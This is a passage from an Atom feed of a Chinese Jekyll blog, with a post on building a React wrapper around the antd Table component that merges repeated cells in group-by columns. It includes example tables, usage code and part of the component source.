<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://pandolia.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://pandolia.net/" rel="alternate" type="text/html" hreflang="zh-CN" /><updated>2019-04-01T09:53:05+08:00</updated><id>https://pandolia.net/feed.xml</id><title type="html">Pandolia 的博客</title><subtitle>Pandolia 的博客</subtitle><entry><title type="html">给 antd table 增加自动合并上一行的功能</title><link href="https://pandolia.net/front-end/2019/03/31/antd-table-with-auto-merge-above/" rel="alternate" type="text/html" title="给 antd table 增加自动合并上一行的功能" /><published>2019-03-31T00:00:00+08:00</published><updated>2019-03-31T00:00:00+08:00</updated><id>https://pandolia.net/front-end/2019/03/31/antd-table-with-auto-merge-above</id><content type="html" xml:base="https://pandolia.net/front-end/2019/03/31/antd-table-with-auto-merge-above/">&lt;p&gt;数据库查询时经常会使用到 group by 查询，对于此类查询返回的结果列表，用户往往会期望显示出来的表格能够合并 group by 字段对应的列。比如，对于下面的数据，期望 Department 和 Role 列能合并。&lt;/p&gt;

&lt;!--more--&gt;

&lt;div class=&quot;my-table&quot;&gt;
    &lt;table&gt;
        &lt;thead&gt;
            &lt;tr&gt;&lt;th&gt;Department&lt;/th&gt;&lt;th&gt;Role&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
            &lt;tr&gt;&lt;td&gt;IT&lt;/td&gt;&lt;td&gt;Manager&lt;/td&gt;&lt;td&gt;Jack&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;IT&lt;/td&gt;&lt;td&gt;Manager&lt;/td&gt;&lt;td&gt;Mike&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;IT&lt;/td&gt;&lt;td&gt;Employee&lt;/td&gt;&lt;td&gt;Tom&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;HR&lt;/td&gt;&lt;td&gt;Manager&lt;/td&gt;&lt;td&gt;John&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;HR&lt;/td&gt;&lt;td&gt;Employee&lt;/td&gt;&lt;td&gt;Jim&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;HR&lt;/td&gt;&lt;td&gt;Employee&lt;/td&gt;&lt;td&gt;Joe&lt;/td&gt;&lt;/tr&gt;
        &lt;/tbody&gt;
    &lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;合并之后的表格效果如下，显然合并后的效果更好。&lt;/p&gt;

&lt;div class=&quot;my-table&quot;&gt;
    &lt;table&gt;
        &lt;thead&gt;
            &lt;tr&gt;&lt;th&gt;Department&lt;/th&gt;&lt;th&gt;Role&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
            &lt;tr&gt;&lt;td rowspan=&quot;3&quot;&gt;IT&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;Manager&lt;/td&gt;&lt;td&gt;Jack&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Mike&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Employee&lt;/td&gt;&lt;td&gt;Tom&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td rowspan=&quot;3&quot;&gt;HR&lt;/td&gt;&lt;td&gt;Manager&lt;/td&gt;&lt;td&gt;John&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td rowspan=&quot;2&quot;&gt;Employee&lt;/td&gt;&lt;td&gt;Jim&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Joe&lt;/td&gt;&lt;/tr&gt;
        &lt;/tbody&gt;
    &lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;目前 antd 的 Table 组件 API 并不包含自动合并的功能，需要开发人员自己写相应的 column 的 render 函数，实现方式也略为复杂。以下给出一个封装后的 MyTable 组件，可以自动合并用户期望合并的列。&lt;/p&gt;

&lt;p&gt;用法非常简单，只需要在 columns 参数里面在对应的列上增加一个 mergeAbove 为 true 的属性就可以了，其余属性和原 Table 组件是一样的。示例代码如下：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ReactDOM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react-dom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;MyTable&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'./my-table'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;App&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Department'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dataIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'department'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mergeAbove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;        
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Role'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dataIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'role'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mergeAbove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dataIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dataSource&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'IT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Manager'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Jack'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'IT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Manager'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Mike'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'IT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Employee'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'HR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Manager'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'John'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'HR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Employee'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Jim'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'HR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Employee'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Joe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MyTable&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dataSource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dataSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rowKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;ReactDOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;App&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以下为 MyTable 组件的源码，基本思路是对传入的 columns 中 mergeAbove 属性为真的列的 render 函数进行改写，改写后的 render 函数会根据当前行所在的位置与相邻行的值进行对比，并根据位置及对比情况返回 rowSpan 为 0 或者合并行数 n 的属性。最后将改写后的新 columns 以及其他属性传递给 Table 组件。以此实现列的自动合并。&lt;/p&gt;

&lt;p&gt;此外，为避免每次 update 时都重新计算新的 columns ，利用了 memoize-one 库对计算新 columns 的函数进行了包装，包装后的函数会记住它被调用时传入的参数以及计算结果，如果下一次调用时传入函数参数不变，那么会直接返回上一次调用的计算结果。（当然在 componentWillReceiveProps 进行判断再重新计算也可以，但使用 memoize 使代码更加清晰，是 react 开发团队更建议的方式）。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// my-table.js&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'antd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memoize&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'memoize-one'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;MyTable&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;buildNewColumns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;memoize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mergeAbove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;originRender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dataIndex&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mergeAbove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dataSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;c1&quot;&gt;// 当有分页时，antd 传递进来的第三个参数行索引 index 是错的，因此&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 用 findIndex 找到正确的行索引，要求 data 里面不得出现两个相同&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// 的行（一般不会出现这种情况）。&lt;/span&gt;
                &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;findIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

                &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dataIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;children&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rowSpan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;children&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;originRender&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;originRender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nextI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nextI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dataIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
